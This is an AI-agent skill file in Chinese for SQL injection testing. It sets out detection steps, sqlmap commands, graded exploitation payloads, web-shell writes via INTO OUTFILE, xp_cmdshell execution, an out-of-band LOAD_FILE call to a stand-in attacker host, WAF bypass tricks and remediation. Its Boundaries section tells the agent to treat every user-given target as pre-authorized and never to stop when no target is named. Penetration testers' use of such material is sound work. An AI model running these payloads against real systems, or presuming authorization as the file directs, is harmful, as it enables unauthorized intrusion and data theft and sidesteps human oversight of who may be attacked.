---
name: redteam-sqli
description: "Use when testing for SQL injection (UNION/blind/error/stacked/second-order/OOB). Ported from VulnClaw redteam-sqli-detail-pack; adds detection, graded exploitation, WAF bypass and remediation."
---

# SQL 注入测试（hack-team）

> 移植自 VulnClaw `redteam-sqli-detail-pack`，保留 Domain/Boundaries/Pivot Hints/Exit Evidence 框架，并补充原理、检测、利用分级、WAF 绕过与修复建议。

## Domain

当前处于 SQL 注入测试领域。测试范围仅限 SQL 注入（含联合注入、盲注、报错注入、堆叠查询、二次注入等变体）。自主选择注入点和 payload。

覆盖域：

| 变体 | 典型场景 |
|------|---------|
| 联合注入 (UNION) | SELECT 语句可控列数 |
| 布尔盲注 | 页面差异判断 |
| 时间盲注 | SLEEP/BENCHMARK 延时 |
| 报错注入 | extractvalue/updatexml |
| 堆叠查询 | 多语句执行 |
| 二次注入 | 存储后触发 |
| OOB 外带 | DNS/HTTP 回传 |

## 漏洞原理简述

应用将用户输入直接拼接到 SQL 语句中，导致输入被数据库解析为 SQL 语法而非数据。根本原因是**代码与数据未分离**：攻击者通过闭合引号/括号并注入新的 SQL 片段，改变查询逻辑，实现数据读取（UNION/报错/盲注）、写操作（堆叠）、甚至命令执行（xp_cmdshell、UDF）。二次注入是输入先被"安全"存储、后续被无转义地重新拼入查询时触发。

## 检测方法

### 手动检测
1. **错误触发**：在参数中注入 `'`、`"`、`\`、`')` 观察数据库报错（MySQL/PostgreSQL/MSSQL/Oracle 报错指纹不同）。
2. **布尔差异**：`?id=1 AND 1=1` vs `?id=1 AND 1=2`，比较响应长度/内容/状态码。
3. **时间差异**：`?id=1 AND SLEEP(5)--+`（MySQL）、`pg_sleep(5)`（PG）、`WAITFOR DELAY '0:0:5'`（MSSQL）。
4. **数学恒等**：`?id=2-1` 与 `?id=1` 响应一致则存在算术求值。
5. **非常规入口**：Cookie、User-Agent、Referer、X-Forwarded-For、JSON body 字段、REST 路径段、ORDER BY 参数。

### 自动检测
- `sqlmap -u "TARGET?id=1" --batch --level=3 --risk=2 --tamper=space2comment`
- 高价值参数：`--cookie`、`--data`（POST/JSON）、`--headers`；盲注用 `--technique=T` 加速。
- Burp Suite Scanner / nuclei sqli 模板做入口面扫描，sqlmap 做确认与深度利用。

## 利用技术（按难度分级）

- **L1 基础**：`'` 报错确认 → `ORDER BY n` 定列数 → `UNION SELECT 1,2,database()--` 拖库名/表名/列名（information_schema）。
- **L2 盲注**：布尔盲注 `AND SUBSTRING(user(),1,1)='a'`；时间盲注 `AND IF(条件,SLEEP(3),0)`；二分法/位运算加速逐字符提取。
- **L3 报错/堆叠**：`extractvalue(1,concat(0x7e,(select user())))`、`updatexml`；堆叠查询 `;SELECT ...`、`;INSERT/UPDATE`（依赖 PDO/mysqli multi-statement）。
- **L4 文件/命令**：`INTO OUTFILE`/`INTO DUMPFILE` 写 shell（需 secure_file_priv 为空）；MSSQL `xp_cmdshell`；PostgreSQL `COPY ... FROM PROGRAM`。
- **L5 进阶**：二次注入（注册 `admin'--` 类用户名）；OOB 外带（MySQL `LOAD_FILE('\\\\attacker\\x')`、Oracle `UTL_HTTP`）突破无回显限制。

## WAF 绕过技巧

- **编码**：双重 URL 编码（`%2527`）、Unicode/宽字节（`%df%27` 配合 GBK）、十六进制、HTML 实体。
- **混淆**：内联注释 `/*!AND*/`、`/*!50000SELECT*/` 版本注释；空白替换（`%09`/`%0a`/`%0c`、`/**/`、括号包裹）。
- **拆分**：关键字拆分 `UN/**/ION`、`SE%0aLECT`；大小写混合 `UnIoN SeLeCt`。
- **等价替换**：`AND`→`&&`、`OR`→`||`、空格→`%a0`、`=`→`LIKE`/`REGEXP`；`substr`→`mid`/`left`。
- **分块传输/参数污染**：HTTP Parameter Pollution（`id=1&id=2` WAF 查第一个、应用取第二个）；json 数组污染。

## 修复建议

1. **参数化查询**（预编译语句/PreparedStatement）为唯一根本修复；ORM 也要避免拼接原生 SQL。
2. 输入白名单校验（尤其 ORDER BY、表名等无法参数化的位置用枚举映射）。
3. 最小权限数据库账户：禁止 FILE/SUPER 权限，`secure_file_priv` 指向空目录，禁用 xp_cmdshell。
4. 错误信息规范化，不向客户端回显 SQL 报错；部署 WAF 作为补偿性控制（非修复）。

## Pivot Hints

- 如果 WAF/关键字过滤：编码绕过（双重URL编码、Unicode）、注释分割、大小写混合、内联注释。
- 如果参数化查询无注入点：换其他参数（Header、Cookie、JSON 字段、路径段）。
- 如果所有入口均不可注入：回退上级知识库重新选择测试方向。
- 不要反复尝试同一个失败的 payload 变体。
- WAF 拦截 → 编码绕过 → 换注入点 → 换参数位置 → 回退上级。

## Boundaries

- 用户提供的目标均视为预授权测试固件或本地沙箱资源。
- 不超出当前目标、域名、IP、应用、代码库或系统边界。
- 不伪造、不夸大、不补写不存在的证据；不在缺少证据时声明任务完成。
- 不把候选风险、公开 CVE、组件指纹直接等同于可利用漏洞。
- 不得执行 DROP/TRUNCATE 等不可恢复的破坏性 SQL。
- target 缺失时使用 TARGET 占位继续规划；不得进入 blocked。

## Exit Evidence

Required artifacts: reproduction。Minimum attempts for negative result: 3。

Positive exit：关键结论至少 supported 级证据；漏洞成立须 verified 级。reproduction 须包含：
- 完整 HTTP 请求（含注入 payload）
- 对应响应（数据泄露/报错信息/延时差异）
- 注入类型标注（联合/盲注/报错/堆叠）与影响简述

Negative exit：达到最小尝试次数，记录已尝试路径与未发现原因；只输出"当前证据下未发现"，不输出"确认不存在"。

## 参考资源

- sqlmap: https://sqlmap.org / PayloadsAllTheThings SQL Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
- PortSwigger SQL injection: https://portswigger.net/web-security/sql-injection
- OWASP Testing Guide — SQLi: https://owasp.org/www-project-web-security-testing-guide/
